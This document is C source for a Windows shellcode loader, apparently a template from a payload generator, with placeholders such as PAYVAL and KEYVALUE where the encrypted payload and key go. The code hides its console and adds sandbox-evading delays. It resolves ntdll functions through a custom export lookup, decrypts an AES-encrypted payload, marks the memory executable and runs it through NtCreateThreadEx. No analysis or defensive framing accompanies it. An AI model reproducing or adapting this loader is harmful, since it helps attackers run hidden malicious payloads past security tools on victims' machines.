#include <windows.h>
#include <ntstatus.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#include <psapi.h>
#include <tlhelp32.h>
#include <wchar.h>
#include <tchar.h>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(WINAPI* NtCreateThreadExPtr)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN LPVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN LPTHREAD_START_ROUTINE StartAddress,
    IN LPVOID Parameter,
    IN BOOL CreateSuspended,
    IN ULONG StackZeroBits,
    IN ULONG SizeOfStackCommit,
    IN ULONG SizeOfStackReserve,
    OUT LPVOID BytesBuffer
);

LPVOID(WINAPI* ALloc_virEt)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

char XOR_VARIABLE[] = "XOR_KEY";

unsigned char Random9[] = VIRALO};

// Custom GetProcAddress function
typedef FARPROC(__stdcall* ARPROC)(HMODULE, LPCSTR);

FARPROC gettingGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);
    DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
        if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
            return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
        }
    }

    return NULL;
}

unsigned char jJahKM[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };

static NTSTATUS(__stdcall* NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) =
    (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER))gettingGetProcAddress(GetModuleHandleA(jJahKM), "NtDelayExecution");

static NTSTATUS(__stdcall* ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) =
    (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG))gettingGetProcAddress(GetModuleHandleA(jJahKM), "ZwSetTimerResolution");

static void TheShortestSleep(float milliseconds) {
    static bool once = true;
    if (once) {
        ULONG actualResolution;
        ZwSetTimerResolution(1, true, &actualResolution);
        once = false;
    }

    LARGE_INTEGER interval;
    interval.QuadPart = -1 * (int)(milliseconds * 10000.0f);
    NtDelayExecution(false, &interval);
}

int Random1(char* difern, unsigned int difern_len, char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
        return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, difern, &difern_len)) {
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}



unsigned char Random3[] = PAYVAL
unsigned int Random7_len = sizeof(Random3);

int main(void) {
    
    void* Random6_mem;
    BOOL Random8;
    HANDLE th;
    DWORD oldprotect = 0;

    char Random2[] = KEYVALUE

    unsigned int Random7_len = sizeof(Random3);

    unsigned char sKern[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };

    int pido = 0;
    HANDLE hProc = NULL;

    FreeConsole();
  

    TheShortestSleep(3500);

    // Use NTAllocateVirtualMemory to allocate memory
    PNTALLOCATEVIRTUALMEMORY pNtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(
        GetModuleHandleA(jJahKM), "NtAllocateVirtualMemory");

    SIZE_T RegionSize = Random7_len;
    NTSTATUS status = pNtAllocateVirtualMemory(
        GetCurrentProcess(),
        &Random6_mem,
        0,
        &RegionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        // Handle error
        return -1;
    }

    TheShortestSleep(3500);

    Random1((char*)Random3, Random7_len, Random2, sizeof(Random2));

    RtlCopyMemory(Random6_mem, Random3, Random7_len);

    TheShortestSleep(3500);

    Random8 = VirtualProtect(Random6_mem, Random7_len, PAGE_EXECUTE_READ, &oldprotect);

    NtCreateThreadExPtr NtCreateThreadExFunc = (NtCreateThreadExPtr)gettingGetProcAddress(
        LoadLibraryA(jJahKM), "NtCreateThreadEx");

    if (NtCreateThreadExFunc != NULL) {
        HANDLE hThread = NULL;
        NTSTATUS status = NtCreateThreadExFunc(
            &hThread,
            GENERIC_EXECUTE,
            NULL,
            GetCurrentProcess(),
            (LPTHREAD_START_ROUTINE)Random6_mem,
            NULL,
            FALSE,
            0,
            0,
            0,
            NULL
        );

        if (NT_SUCCESS(status)) {
            // Wait for the thread to finish
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }
    }

    return 0;
}

